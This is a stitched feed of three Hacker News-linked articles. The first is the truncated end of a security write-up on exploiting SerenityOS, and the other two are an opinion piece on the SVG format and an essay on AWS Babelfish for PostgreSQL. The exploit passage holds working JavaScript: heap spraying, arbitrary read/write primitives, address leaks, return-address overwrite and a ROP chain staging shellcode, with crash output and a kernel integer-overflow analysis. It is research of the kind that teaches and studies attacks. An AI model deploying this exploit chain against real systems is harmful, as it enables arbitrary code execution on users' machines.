  <span>for</span> <span>(</span><span>let</span> <span>i</span> <span>=</span> <span>0</span><span>;</span> <span>i</span> <span>&lt;</span> <span>spray_size</span> <span>/</span> <span>2</span><span>;</span> <span>i</span><span>++</span><span>)</span> <span>{</span>
    <span>spray</span><span>[</span><span>i</span><span>]</span> <span>=</span> <span>new</span> <span>Number</span><span>(</span><span>AAAs</span><span>);</span>
  <span>}</span>

  <span>// Create an array with a null backing store allowing arbitary rw</span>
  <span>ab1</span> <span>=</span> <span>new</span> <span>ArrayBuffer</span><span>();</span>
  <span>ua1</span> <span>=</span> <span>new</span> <span>Uint32Array</span><span>(</span><span>ab1</span><span>,</span> <span>4</span><span>,</span> <span>0x3fffffff</span><span>);</span>

  <span>// Create an array with a large length but a valid backing store</span>
  <span>ab2</span> <span>=</span> <span>new</span> <span>ArrayBuffer</span><span>(</span><span>0x50000</span><span>);</span>
  <span>ua2</span> <span>=</span> <span>new</span> <span>Uint32Array</span><span>(</span><span>ab2</span><span>,</span> <span>4</span><span>,</span> <span>0x3fffffff</span><span>);</span>

  <span>for</span> <span>(</span><span>let</span> <span>i</span> <span>=</span> <span>spray_size</span> <span>/</span> <span>2</span><span>;</span> <span>i</span> <span>&lt;</span> <span>spray_size</span><span>;</span> <span>i</span><span>++</span><span>)</span> <span>{</span>
    <span>spray</span><span>[</span><span>i</span><span>]</span> <span>=</span> <span>new</span> <span>Number</span><span>(</span><span>AAAs</span><span>);</span>
  <span>}</span>

  <span>log</span><span>(</span><span>"</span><span>done spraying</span><span>"</span><span>);</span>

  <span>function</span> <span>read</span><span>(</span><span>addr</span><span>)</span> <span>{</span>
    <span>return</span> <span>ua1</span><span>[</span><span>addr</span> <span>/</span> <span>4</span> <span>-</span> <span>1</span><span>];</span>
  <span>}</span>

  <span>function</span> <span>write</span><span>(</span><span>addr</span><span>,</span> <span>value</span><span>)</span> <span>{</span>
    <span>ua1</span><span>[</span><span>addr</span> <span>/</span> <span>4</span> <span>-</span> <span>1</span><span>]</span> <span>=</span> <span>value</span><span>;</span>
  <span>}</span>

  <span>// 0x6c000 is the offset from the array buffer to the next heap allocation</span>
  <span>function</span> <span>read_heap</span><span>(</span><span>off</span><span>)</span> <span>{</span>
    <span>return</span> <span>ua2</span><span>[</span><span>0x6c000</span> <span>/</span> <span>4</span> <span>+</span> <span>off</span><span>];</span>
  <span>}</span>

  <span>function</span> <span>write_heap</span><span>(</span><span>off</span><span>,</span> <span>value</span><span>)</span> <span>{</span>
    <span>ua2</span><span>[</span><span>0x6c000</span> <span>/</span> <span>4</span> <span>+</span> <span>off</span><span>]</span> <span>=</span> <span>value</span><span>;</span>
  <span>}</span>

  <span>let</span> <span>number_i</span> <span>=</span> <span>0</span><span>;</span>

  <span>log</span><span>(</span><span>"</span><span>looking for 0x41414141</span><span>"</span><span>);</span>
  <span>for</span> <span>(</span><span>let</span> <span>i</span> <span>=</span> <span>0</span><span>;</span> <span>i</span> <span>&lt;</span> <span>100</span><span>;</span> <span>i</span><span>++</span><span>)</span> <span>{</span>
    <span>if</span> <span>(</span><span>read_heap</span><span>(</span><span>i</span><span>)</span> <span>==</span> <span>0x41414141</span><span>)</span> <span>{</span>
      <span>log</span><span>(</span><span>"</span><span>found 0x</span><span>"</span> <span>+</span> <span>i</span><span>.</span><span>toString</span><span>(</span><span>16</span><span>)</span> <span>+</span> <span>"</span><span>: 0x</span><span>"</span> <span>+</span> <span>read_heap</span><span>(</span><span>i</span><span>).</span><span>toString</span><span>(</span><span>16</span><span>));</span>
      <span>number_i</span> <span>=</span> <span>i</span><span>;</span>
      <span>break</span><span>;</span>
    <span>}</span>
  <span>}</span>

  <span>const</span> <span>number_i_vtable</span> <span>=</span> <span>number_i</span> <span>-</span> <span>8</span><span>;</span>

  <span>const</span> <span>libjs_data_addr</span> <span>=</span> <span>read_heap</span><span>(</span><span>number_i_vtable</span><span>)</span> <span>-</span> <span>0x28ac</span><span>;</span>
  <span>const</span> <span>libjs_addr</span> <span>=</span> <span>libjs_data_addr</span> <span>-</span> <span>0xe0000</span><span>;</span>
  <span>const</span> <span>stack_addr</span> <span>=</span> <span>libjs_addr</span> <span>-</span> <span>0x2537000</span><span>;</span>

  <span>log</span><span>(</span><span>"</span><span>libjs_data_addr 0x</span><span>"</span> <span>+</span> <span>libjs_data_addr</span><span>.</span><span>toString</span><span>(</span><span>16</span><span>));</span>
  <span>log</span><span>(</span><span>"</span><span>libjs_addr 0x</span><span>"</span> <span>+</span> <span>libjs_addr</span><span>.</span><span>toString</span><span>(</span><span>16</span><span>));</span>
  <span>log</span><span>(</span><span>"</span><span>stack_addr 0x</span><span>"</span> <span>+</span> <span>stack_addr</span><span>.</span><span>toString</span><span>(</span><span>16</span><span>));</span>

  <span>log</span><span>(</span><span>"</span><span>looking for stack return</span><span>"</span><span>);</span>
  <span>let</span> <span>stack_ret</span> <span>=</span> <span>0</span><span>;</span>
  <span>for</span> <span>(</span><span>let</span> <span>i</span> <span>=</span> <span>stack_addr</span> <span>+</span> <span>0x400000</span> <span>-</span> <span>4</span><span>;</span> <span>i</span> <span>&gt;</span> <span>stack_addr</span><span>;</span> <span>i</span> <span>-=</span> <span>4</span><span>)</span> <span>{</span>
    <span>if</span> <span>(</span><span>read</span><span>(</span><span>i</span><span>)</span> <span>==</span> <span>libjs_addr</span> <span>+</span> <span>0x5af5e</span><span>)</span> <span>{</span>
      <span>log</span><span>(</span><span>"</span><span>found stack_ret 0x</span><span>"</span> <span>+</span> <span>i</span><span>.</span><span>toString</span><span>(</span><span>16</span><span>)</span> <span>+</span> <span>"</span><span>: 0x</span><span>"</span> <span>+</span> <span>read</span><span>(</span><span>i</span><span>).</span><span>toString</span><span>());</span>
      <span>stack_ret</span> <span>=</span> <span>i</span><span>;</span>
      <span>break</span><span>;</span>
    <span>}</span>
  <span>}</span>
  <span>write</span><span>(</span><span>stack_ret</span><span>,</span> <span>0x12345678</span><span>);</span>
<span>&lt;/script&gt;</span>
</code></pre></div></div>

<p>Loading the above in the browser resulting in a crash at <code>0x12345678</code>:</p>

<div><div><pre><code>[Browser(37:37)]: CPU[0] NP(error) fault at invalid address V0x12345678
[Browser(37:37)]: Unrecoverable page fault, instruction fetch / read from address V0x12345678
[Browser(37:37)]: CRASH: CPU #0 Page Fault. Ring 3.
[Browser(37:37)]: exception code: 0014 (isr: 0000
[Browser(37:37)]:   pc=001b:12345678 flags=0246
[Browser(37:37)]:  stk=0023:026ff2e4
[Browser(37:37)]:   ds=0023 es=0023 fs=0023 gs=002b
[Browser(37:37)]: eax=026ff3c0 ebx=0491ce8c ecx=00000000 edx=0491e4a0
[Browser(37:37)]: ebp=026ff378 esp=c2a48fe8 esi=00000005 edi=02d0dfd8
[Browser(37:37)]: cr0=80010013 cr2=12345678 cr3=07351000 cr4=003006e4
[Browser(37:37)]: CPU[0] NP(error) fault at invalid address V0x12345678
[Browser(37:37)]: 0x12345678  (?)
</code></pre></div></div>

<p>Since we can write any amount to the stack, it was fairly straight forward to build a rop chain that mmapped a region, put some shellcode there, mprotected it to make it executable, then jump there:</p>

<div><div><pre><code><span>const</span> <span>libc_addr</span> <span>=</span> <span>libjs_addr</span> <span>-</span> <span>0x122000</span><span>;</span>
<span>const</span> <span>mmap_addr</span> <span>=</span> <span>libc_addr</span> <span>+</span> <span>0x1b379</span><span>;</span>
<span>const</span> <span>memcpy_addr</span> <span>=</span> <span>libc_addr</span> <span>+</span> <span>0x002f51d</span><span>;</span>
<span>const</span> <span>mprotect_addr</span> <span>=</span> <span>libc_addr</span> <span>+</span> <span>0x1b487</span><span>;</span>

<span>const</span> <span>shellcode</span> <span>=</span> <span>[</span><span>0xcccccccc</span><span>];</span>

<span>// write our shellcode to a know location (start of the stack)</span>
<span>const</span> <span>shellcode_addr</span> <span>=</span> <span>stack_addr</span><span>;</span>
<span>for</span> <span>(</span><span>let</span> <span>i</span> <span>=</span> <span>0</span><span>;</span> <span>i</span> <span>&lt;</span> <span>shellcode</span><span>.</span><span>length</span><span>;</span> <span>i</span><span>++</span><span>)</span> <span>{</span>
  <span>write</span><span>(</span><span>shellcode_addr</span> <span>+</span> <span>i</span> <span>*</span> <span>4</span><span>,</span> <span>shellcode</span><span>[</span><span>i</span><span>]);</span>
<span>}</span>

<span>log</span><span>(</span><span>"</span><span>shellcode_addr: 0x</span><span>"</span> <span>+</span> <span>shellcode_addr</span><span>.</span><span>toString</span><span>(</span><span>16</span><span>));</span>

<span>// rop gadgets</span>
<span>// 0x000462f3: pop esi; pop edi; pop ebp; ret;</span>
<span>// 0x0007bda9: add esp, 0x10; pop esi; pop edi; pop ebp; ret;</span>

<span>pop7_addr</span> <span>=</span> <span>libjs_addr</span> <span>+</span> <span>0x0007bda9</span><span>;</span>
<span>pop3_adr</span> <span>=</span> <span>libjs_addr</span> <span>+</span> <span>0x000462f3</span><span>;</span>

<span>log</span><span>(</span><span>"</span><span>pop7_addr: 0x</span><span>"</span> <span>+</span> <span>pop7_addr</span><span>.</span><span>toString</span><span>(</span><span>16</span><span>));</span>
<span>log</span><span>(</span><span>"</span><span>pop3_adr: 0x</span><span>"</span> <span>+</span> <span>pop3_adr</span><span>.</span><span>toString</span><span>(</span><span>16</span><span>));</span>

<span>// 1. map region at 0x9d000000</span>
<span>// 2. memcpy our shellcode there</span>
<span>// 3. make it executable</span>
<span>// 4. jump there</span>
<span>write</span><span>(</span><span>stack_ret</span><span>,</span> <span>mmap_addr</span><span>);</span>
<span>const</span> <span>rop</span> <span>=</span> <span>[</span>
  <span>pop7_addr</span><span>,</span> <span>//ret</span>
  <span>0x9d000000</span><span>,</span>
  <span>0x8000</span><span>,</span>
  <span>3</span><span>,</span>
  <span>0x32</span><span>,</span>
  <span>0</span><span>,</span>
  <span>0</span><span>,</span>
  <span>0xdeadbeef</span><span>,</span>

  <span>memcpy_addr</span><span>,</span>
  <span>pop3_adr</span><span>,</span> <span>// ret</span>
  <span>0x9d000000</span><span>,</span>
  <span>shellcode_addr</span><span>,</span>
  <span>0x8000</span><span>,</span>

  <span>mprotect_addr</span><span>,</span>
  <span>pop3_adr</span><span>,</span> <span>// ret</span>
  <span>0x9d000000</span><span>,</span>
  <span>0x8000</span><span>,</span>
  <span>5</span><span>,</span>

  <span>0x9d000000</span><span>,</span>
<span>];</span>
<span>for</span> <span>(</span><span>let</span> <span>i</span> <span>=</span> <span>0</span><span>;</span> <span>i</span> <span>&lt;</span> <span>rop</span><span>.</span><span>length</span><span>;</span> <span>i</span><span>++</span><span>)</span> <span>{</span>
  <span>write</span><span>(</span><span>stack_ret</span> <span>+</span> <span>4</span> <span>*</span> <span>(</span><span>2</span> <span>+</span> <span>i</span><span>),</span> <span>rop</span><span>[</span><span>i</span><span>]);</span>
<span>}</span>

<span>// finish to trigger the rop chain</span>
</code></pre></div></div>

<p>After loading this up and setting a breakpoint with gdb at <code>0x9d000000</code>:</p>

<p><img src="https://devcraft.io/assets/serenity/gef.jpg" alt="gef"></p>

<p>Success! Arbitrary code in the browser.</p>

<h3 id="kernel-bug-hunting">Kernel Bug Hunting</h3>

<p>Next it was time to try and find a kernel bug that could be reached from the browser process. There had been a few issues with integer overflows, so I started looking for places that this might happen. After some searching I saw the following in <a href="https://github.com/SerenityOS/serenity/blob/22b0ff05d4a5b087d805d8147ca12efe410cb18f/Kernel/VM/RangeAllocator.cpp#L139">RangeAllocator::allocate_anywhere</a>:</p>

<div><div><pre><code><span>for</span> <span>(</span><span>size_t</span> <span>i</span> <span>=</span> <span>0</span><span>;</span> <span>i</span> <span>&lt;</span> <span>m_available_ranges</span><span>.</span><span>size</span><span>();</span> <span>++</span><span>i</span><span>)</span> <span>{</span>
    <span>auto</span><span>&amp;</span> <span>available_range</span> <span>=</span> <span>m_available_ranges</span><span>[</span><span>i</span><span>];</span>

    <span>// FIXME: This check is probably excluding some valid candidates when using a large alignment.</span>
    <span>if</span> <span>(</span><span>available_range</span><span>.</span><span>size</span><span>()</span> <span>&lt;</span> <span>(</span><span>effective_size</span> <span>+</span> <span>alignment</span><span>))</span>
        <span>continue</span><span>;</span>
</code></pre></div></div>

<p>Each process has a list of available ranges that are used when allocating memory regions. This code is looping through all the ranges and seeing if there is one large enough to hold the requested size, taking into account the alignment (both <code>effective_size</code> and <code>alignment</code> are controlled by the user). The issue is that <code>effective_size + alignment</code> can overflow, resulting in a range being chosen that is too small to hold the requested size.</p>

<p>The <code>available_range</code> is then used to create a new allocated range:</p>

<div><div><pre><code>    <span>FlatPtr</span> <span>initial_base</span> <span>=</span> <span>available_range</span><span>.</span><span>base</span><span>().</span><span>offset</span><span>(</span><span>offset_from_effective_base</span><span>).</span><span>get</span><span>();</span>
    <span>FlatPtr</span> <span>aligned_base</span> <span>=</span> <span>round_up_to_power_of_two</span><span>(</span><span>initial_base</span><span>,</span> <span>alignment</span><span>);</span>

    <span>Range</span> <span>allocated_range</span><span>(</span><span>VirtualAddress</span><span>(</span><span>aligned_base</span><span>),</span> <span>size</span><span>);</span>
    <span>if</span> <span>(</span><span>available_range</span> <span>==</span> <span>allocated_range</span><span>)</span> <span>{</span>
        <span>dbgln</span><span>&lt;</span><span>VRA_DEBUG</span><span>&gt;</span><span>(</span><span>"VRA: Allocated perfect-fit anywhere({}, {}): {}"</span><span>,</span> <span>size</span><span>,</span> <span>alignment</span><span>,</span> <span>allocated_range</span><span>.</span><span>base</span><span>().</span><span>get</span><span>());</span>
        <span>m_available_ranges</span><span>.</span><span>remove</span><span>(</span><span>i</span><span>);</span>
        <span>return</span> <span>allocated_range</span><span>;</span>
    <span>}</span>
    <span>carve_at_index</span><span>(</span><span>i</span><span>,</span> <span>allocated_range</span><span>);</span>

    <span>return</span> <span>allocated_range</span><span>;</span>
</code></pre></div></div>

<p>If it isn‚Äôt exactly equal then it carves out the range and add the remaining range back into <code>m_available_ranges</code>:</p>

<div><div><pre><code><span>void</span> <span>RangeAllocator</span><span>::</span><span>carve_at_index</span><span>(</span><span>int</span> <span>index</span><span>,</span> <span>const</span> <span>Range</span><span>&amp;</span> <span>range</span><span>)</span>
<span>{</span>
    <span>ASSERT</span><span>(</span><span>m_lock</span><span>.</span><span>is_locked</span><span>());</span>
    <span>auto</span> <span>remaining_parts</span> <span>=</span> <span>m_available_ranges</span><span>[</span><span>index</span><span>].</span><span>carve</span><span>(</span><span>range</span><span>);</span>
    <span>ASSERT</span><span>(</span><span>remaining_parts</span><span>.</span><span>size</span><span>()</span> <span>&gt;=</span> <span>1</span><span>);</span>
    <span>m_available_ranges</span><span>[</span><span>index</span><span>]</span> <span>=</span> <span>remaining_parts</span><span>[</span><span>0</span><span>];</span>
    <span>if</span> <span>(</span><span>remaining_parts</span><span>.</span><span>size</span><span>()</span> <span>==</span> <span>2</span><span>)</span>
        <span>m_available_ranges</span><span>.</span><span>insert</span><span>(</span><span>index</span> <span>+</span> <span>1</span><span>,</span> <span>move</span><span>(</span><span>remaining_parts</span><span>[</span><span>1</span><span>]));</span>
<span>}</span>

<span>Vector</span><span>&lt;</span><span>Range</span><span>,</span> <span>2</span><span>&gt;</span> <span>Range</span><span>::</span><span>carve</span><span>(</span><span>const</span> <span>Range</span><span>&amp;</span> <span>taken</span><span>)</span>
<span>{</span>
    <span>Vector</span><span>&lt;</span><span>Range</span><span>,</span> <span>2</span><span>&gt;</span> <span>parts</span><span>;</span>
    <span>if</span> <span>(</span><span>taken</span> <span>==</span> <span>*</span><span>this</span><span>)</span>
        <span>return</span> <span>{};</span>
    <span>if</span> <span>(</span><span>taken</span><span>.</span><span>base</span><span>()</span> <span>&gt;</span> <span>base</span><span>())</span>
        <span>parts</span><span>.</span><span>append</span><span>({</span> <span>base</span><span>(),</span> <span>taken</span><span>.</span><span>base</span>‚Ä¶</code></pre></div></div></div></article></section></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://devcraft.io/2021/02/11/serenityos-writing-a-full-chain-exploit.html">https://devcraft.io/2021/02/11/serenityos-writing-a-full-chain-exploit.html</a></em></p>]]>
            </description>
            <link>https://devcraft.io/2021/02/11/serenityos-writing-a-full-chain-exploit.html</link>
            <guid isPermaLink="false">hacker-news-small-sites-26115141</guid>
            <pubDate>Fri, 12 Feb 2021 16:09:12 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[SVG: The Good, the Bad and the Ugly]]>
            </title>
            <description>
<![CDATA[
Score 214 | Comments 207 (<a href="https://news.ycombinator.com/item?id=26114863">thread link</a>) | @davebloggt
<br/>
February 12, 2021 | https://www.eisfunke.com/article/svg-the-good-the-bad-and-the-ugly.html | <a href="https://web.archive.org/web/*/https://www.eisfunke.com/article/svg-the-good-the-bad-and-the-ugly.html">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><p>
                        SVG, short for <em>‚Äúscalable vector graphics‚Äù</em> is a format for, well, scalable vector graphics. In this article I summarize my opinion of the format, what its problems are and suggest what could be done to improve things.
                    </p><div id="article">
                <!-- Body -->
<figure>
<img src="https://www.eisfunke.com/res/article/svg-logo.svg" alt=""><figcaption>The SVG logo.<a href="#fn1" id="fnref1" role="doc-noteref"><sup>1</sup></a></figcaption>
</figure>
<p><a href="https://en.wikipedia.org/wiki/Scalable_Vector_Graphics">SVG</a>, short for <em>‚Äúscalable vector graphics‚Äù</em> is a format for, well, scalable vector graphics. In this article I summarize my opinion of the format, what its problems are and suggest what could be done to improve things.</p>
<p>I‚Äôve been using SVG together with Inkscape regularly for a few years for sketches and graphics, and like to write it by hand to satisfy my love for precision and art through code. SVG and I have a kind of love-hate relationship. It‚Äôs powerful and has some nice free and open-source tooling, but the format itself is pretty ugly.</p>
<h2 id="the-good">The Good</h2>
<ul>
<li><p>It‚Äôs <em>the</em> format for vector graphics. It is well supported by a range of programs from Adobe Illustrator to Inkscape for editing and in various browsers.</p></li>
<li><p>It‚Äôs a web standard so you can use it directly in websites. You can also use CSS with it.</p></li>
<li><p>It‚Äôs XML-based, so the syntax is familiar, it‚Äôs extensible and can benefit from the vast XML ecosystem. For example, using <a href="https://en.wikipedia.org/wiki/XLink">XLink</a> you can reference other elements and definitions in an SVG file. Or <a href="https://inkscape.org/">Inkscape</a> uses custom XML tags to extend SVG into their editor exchange format.</p></li>
<li><p>It‚Äôs powerful. You can do <em>a lot</em> with it. It obviously supports various path types and shapes, supports text and more, but also animations, gradients, effects and more.</p></li>
</ul>
<h2 id="the-bad">The Bad</h2>
<p>It‚Äôs a web standard. And as is customary for a web standard, SVG is magnificiently bloated. The <a href="https://www.w3.org/TR/SVG11/REC-SVG11-20110816.pdf">SVG specification</a> brings a whopping 826 (<em>eight-hundred twenty-six</em>) pages to the table. And as if that‚Äôs not enough, it‚Äôs also XML-based and cross-linked with other web standards, driving the scope of any implementation to dizzying heights.</p>
<p>If you want to be sure to correctly render all SVG files, not only do you have to consider 800 pages of SVG spec, but e.g.&nbsp;another 20 pages of <a href="https://www.w3.org/TR/xlink11/">XLink spec</a>. Oh, and CSS as well, by the way. And, I shit you not, <em>JAVASCRIPT</em>. Yes. <a href="https://developer.mozilla.org/en-US/docs/Web/SVG/Element/script">SVG files can include <code>&lt;script&gt;</code> tags.</a></p>
<p>SVG fits right in with web browsers. They‚Äôre hilariously bloated already, they already implement stuff like CSS and JavaScript that a complete SVG implementation requires. This problem of SVG is actually just the <a href="https://drewdevault.com/2020/03/18/Reckless-limitless-scope.html">problem of the web in general</a>. It‚Äôs scope is huge, it‚Äôs bloated and hard to work with.</p>
<p>SVG is nothing you could implement in a day. Or a week. Or a month. The huge amount of specifications, that are most often only partly implemented, makes it very hard to overview what supports what, confusing the user as to what features they can actually use if they want their SVG file to be universally supported.</p>
<p>Furthermore the XML-based syntax is pretty ugly and needlessly verbose. It‚Äôs tiring to write by hand and just as tiring to parse or generate automatically.</p>
<h2 id="the-ugly">The Ugly</h2>
<p>A central problem that can be extracted from the points listed above is the one I detailed in my article about <a href="https://www.eisfunke.com/article/language-design-machine-or-human.html">language design for machines vs.&nbsp;humans</a>: SVG doesn‚Äôt know what it wants to be, a machine-focused language or a human-focused language and ends up doing badly in both aspects.</p>
<p>Is it a machine-processible language? It‚Äôs far too bloated for that. Writing parsers, renderers and generators for SVGs is a huge task. The syntax is repetitive and complex. It has a lot of features that could be represented by more basic features.</p>
<p>But is it a format well-suited for direct usage by humans? Well, no. Firstly, the exhausting syntax and complexity is also bad for human users. Secondly, it misses a lot of features that would make it suitable for direct use. A graphics language that is meant for direct human use would be <a href="http://texdoc.net/pkg/tikz">Ti<em>k</em>Z</a> for LaTeX. While it‚Äôs not a great language regarding user experience in my opinion, it is definitely meant for humans and has the necessary features to help making creating complex graphics easy. But nobody would have the idea to use Ti<em>k</em>Z code as an interchange format for the finished graphic. Nobody would want to implement 1300 pages of Ti<em>k</em>Z manual just to view some graphic. Instead you compile it into an PDF (which is also a horrible format and badly bloated, but well). If SVG was a language meant for human use, compiling it into a machine-focused format would be the way to go as well, but as I said ‚Äì it isn‚Äôt. It‚Äôs neither.</p>
<h2 id="what-now">What now?</h2>
<p>A good idea would be to develop a simple vector graphics exchange format that is desigend to be easily processed by machines. As minimal in features as possible. Maybe JSON-based, definitely not XML-based. You should be able to implement a basic renderer in a few days, or even better, hours, without depending on two metric tons of XML ecosystem libraries. Bezier curves, elliptic curves, fills, outlines and gradients should mostly suffice to represent every unanimated SVG. An extension could allow animations in a separate file extension.</p>
<p>This minimal and well-delimited format could then have a strict test suite and be implemented in browsers and image viewers with relative ease. Users could rely on their graphic working everywhere and implementers wouldn‚Äôt have to worry about implementing XLink, CSS and JavaScript as well. It could save bandwidth and computation power. Compilers from and to SVG could be written for compatibility.</p>
<p>It could be used as export format of user-facing programs like Inkscape or Adobe Illustrator. For people wanting to markup graphics through code there‚Äôs already stuff like Ti<em>k</em>Z, <a href="https://diagrams.github.io/">Haskell diagrams</a> or <a href="https://matplotlib.org/stable/index.html">Python matplotlib</a> that could also export to the new minimal interchange format.</p>
<p>I‚Äôm actually thinking about making a slim machine-focused vector graphics format (the name <em>‚ÄúSlimSVG‚Äù</em> has been suggested :D) and writing my own human-focused Haskell graphics creation library with similar goals for my own purposes in the future, maybe as a student research project for the university.</p>
<p>In summary: Decide whether a language is for humans or for machines and do one of those things. And do the one thing well instead of both, but badly.</p>
<hr>
<p><strong>Update 1:</strong> This article was posted on <a href="https://news.ycombinator.com/item?id=26114863">Hacker News</a> and landed on the front page, currently it‚Äôs on rank 3. I‚Äôm honored! <a href="https://news.ycombinator.com/reply?id=26115086&amp;goto=item%3Fid%3D26114863%2326115086">In the comments there</a> somebody mentioned an <a href="https://www.xul.fr/svgtetris.svg">interesting use of the <code>&lt;script&gt;</code> tag in SVG</a>. I‚Äôm unsure though whether I should be impressed or horrified :D</p>
<p><strong>Update 2:</strong> Somebody posted this on <a href="https://www.reddit.com/r/programming/comments/livw57/svg_the_good_the_bad_and_the_ugly">Reddit</a> as well. Currently, there are over 150 comments, wow.</p>
<p><strong>Update 3:</strong> PEOPLE, PLEASE. This is absolutely not about ‚ÄúXML is bad, let‚Äôs do JSON instead‚Äù. I actually like XML more than JSON in total, I‚Äôm a fan of XML schema and nice strong schemas. And while I still don‚Äôt like the syntax, XML generally is a good fit for a document markup language like HTML. I mostly wouldn‚Äôt care whether a good format with a good data model was encoded in JSON, XML, YAML, binary, Brainfuck or monkey feces. The encoding really is the least important part. I just think that for a strictly machine-focused format for data JSON would be a better choice.</p>
<p>I guess though I should have anticipated that saying that I don‚Äôt like XML and then mentioning the word ‚ÄúJSON‚Äù would start a religious war.</p>
<section role="doc-endnotes">
<hr>
<ol>
<li id="fn1" role="doc-endnote"><p><a href="https://commons.wikimedia.org/wiki/File:SVG_logo.svg">Image source</a>, licensed under CC-BY-SA-4.0<a href="#fnref1" role="doc-backlink">‚Ü©Ô∏é</a></p></li>
</ol>
</section>
                <!-- /Body -->
            </div></div>]]>
            </description>
            <link>https://www.eisfunke.com/article/svg-the-good-the-bad-and-the-ugly.html</link>
            <guid isPermaLink="false">hacker-news-small-sites-26114863</guid>
            <pubDate>Fri, 12 Feb 2021 15:43:00 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[AWS Babelfish: The Elephant in the PostgreSQL Room?]]>
            </title>
            <description>
<![CDATA[
Score 192 | Comments 158 (<a href="https://news.ycombinator.com/item?id=26114281">thread link</a>) | @ahachete
<br/>
February 12, 2021 | https://postgresql.fund/blog/babelfish-the-elephant-in-the-room/ | <a href="https://web.archive.org/web/*/https://postgresql.fund/blog/babelfish-the-elephant-in-the-room/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><section>
    <div>
        <div>
            <div>
                
                <div>
                    <p>On December 1st, 2020, <a href="https://aws.amazon.com/blogs/opensource/want-more-postgresql-you-just-might-like-babelfish/">Amazon AWS announced Babelfish</a>. Babelfish ‚Äú<em>adds an endpoint to PostgreSQL that understands the SQL Server wire protocol Tabular Data Stream (TDS), as well as commonly used T-SQL commands used by SQL Server. Support for T-SQL includes elements such as the SQL dialect, cursors, catalog views, data types, triggers, stored procedures, and functions</em>‚Äù. Wow. <strong>SQL Server wire and application compatibility for PostgreSQL!</strong></p>
<p>What this means is that Babelfish will be able to ‚Äúimpersonate‚Äù a SQL Server database. Applications may be able to run unchanged, believing that they are connecting to SQL Server, when they will actually be connecting to PostgreSQL-Babelfish.</p>
<p>Surely, compatibility will not be 100% at the beginning. But it will keep improving, and <strong>as long as it provides enough compatibility for a nice set of applications to run unchanged on Babelfish, it will open the door to migrations and replacing SQL Servers with Babelfish</strong>. This is very good news for the PostgreSQL Community!</p>
<h2 id="brief-analysis-on-postgresql-popularity">Brief analysis on PostgreSQL popularity</h2>
<p><a href="https://db-engines.com/en/blog_post/85">PostgreSQL has been named (again) database of the year 2020</a>. This award is given based on ‚Äú<em>DBMSs sorted by how much they managed to increase their popularity in 2020</em>‚Äù, which means that <strong>PostgreSQL was the database that grew the most in popularity in 2020</strong>. <strong>But in absolute terms, PostgreSQL‚Äôs popularity is still way behind that of Oracle, MySQL and SQL Server</strong>. Let‚Äôs analyze <a href="https://db-engines.com/en/ranking_trend">db-engines popularity trend chart</a> for the Top4 DBMS, on a linear scale (db-engines presents results on a logarithmic scale):</p>
<p><img src="https://postgresql.fund/img/dbengines_popularity_ranking-linear-900.png" alt="DB-engines popularity ranking - linear scale"></p>
<p>The trends for the last 8 years are clear: Oracle and SQL Server are constantly declining in popularity; MySQL is slightly declining; and PostgreSQL is clearly growing in popularity. But while PostgreSQL almost tripled in popularity in these eight years, it is still far behind the other three.</p>
<p>PostgreSQL became the database of 2020 because its popularity grew the most in the last year. The other three mentioned databases declined in popularity during 2020. If we assume the same rate of change in popularity will continue for the upcoming years, by 2025 PostgreSQL would still remain in the 4th place, albeit close to SQL Server. It won‚Äôt overtake SQL Server until 2026, and by 2030 PostgreSQL would still lag behind Oracle and MySQL.</p>
<table>
<thead>
<tr>
<th></th>
<th>Jan 21</th>
<th>+/- Jan 20</th>
<th>Est. 2025</th>
<th>Est. 2030</th>
</tr>
</thead>
<tbody>
<tr>
<td><em>Oracle</em></td>
<td>1,317</td>
<td>-28</td>
<td>1,204</td>
<td>1,064</td>
</tr>
<tr>
<td><em>MySQL</em></td>
<td>1,243</td>
<td>-24</td>
<td>1,146</td>
<td>1,025</td>
</tr>
<tr>
<td><em>Microsoft SQL Server</em></td>
<td>1,023</td>
<td>-71</td>
<td>740</td>
<td>386</td>
</tr>
<tr>
<td><em>PostgreSQL</em></td>
<td>551</td>
<td>44</td>
<td>727</td>
<td>947</td>
</tr>
</tbody>
</table>
<p>How is this analysis related to Babelfish? <strong>Babelfish opens the door to new users, new markets, new opportunities. <strong>Babelfish may bump PostgreSQL‚Äôs popularity further, targeting use cases that either PostgreSQL is not able to reach today; or can only reach via complex technology migrations.</strong> Babelfish could be one of the many potential boosts that PostgreSQL needs in order to become a more universally used database</strong>.</p>
<h2 id="to-fork-or-not-to-fork-thats-the-question">To fork, or not to fork, that‚Äôs the question</h2>
<p>In their announcement, AWS said that ‚Äú<em>We are open sourcing Babelfish in 2021. [‚Ä¶] We are releasing Babelfish under the Apache 2.0 license. We invite others to become active in the project, and we will see it as a sign of success when developers outside of AWS become committers or maintainers. You can help by adding or extending Babelfish functionality, submitting feature requests, working on documentation, and contributing test cases</em>‚Äù. They also mentioned the code will be published on GitHub.</p>
<p><strong>At the time Babelfish will be published, it will likely require changes to PostgreSQL to enable Babelfish to be an extension</strong>. Some people may call that a ‚Äúfork‚Äù of PostgreSQL, and others may call it a ‚Äúdevelopment branch‚Äù. The difference between the two will only be clear over time. Note that PostgreSQL development model doesn‚Äôt use feature branches, and in my opinion it‚Äôs a great model ‚Äìbut this is an entirely different topic. It is really appreciated that AWS is releasing the code as open source, and under a permissive license (that should be compatible with PostgreSQL‚Äôs). <strong>If AWS developers work with the PostgreSQL Community to get the necessary changes merged into PostgreSQL core, then it would have been a development branch, and not a fork. This is something that the PostgreSQL Community and all parties involved need to figure out</strong>.</p>
<p>On January 25th, Amazon AWS made a first move. In an <a href="https://www.postgresql.org/message-id/CAGBW59d5SjLyJLt-jwNv%2BoP6esbD8SCB%3D%3D%3D11WVe5%3DdOHLQ5wQ%40mail.gmail.com">email to PostgreSQL‚Äôs hackers mailing list</a>, Jan Wieck, a well-known Postgres-er, proposed to start discussing the implementation of protocol hooks. These hooks would enable to implement SQL Server‚Äôs protocol as an extension, rather than a fork.</p>
<p>Protocol hooks are, possibly, not the only hooks or modifications to PostgreSQL core that would be required to integrate the whole Babelfish project. With those changes to the core most of the Babelfish code could possibly be integrated in core as an extension(s). I cannot estimate the complexity of these core changes. But I believe that it would be a worthwhile effort, an effort that may further increase PostgreSQL outreach.</p>
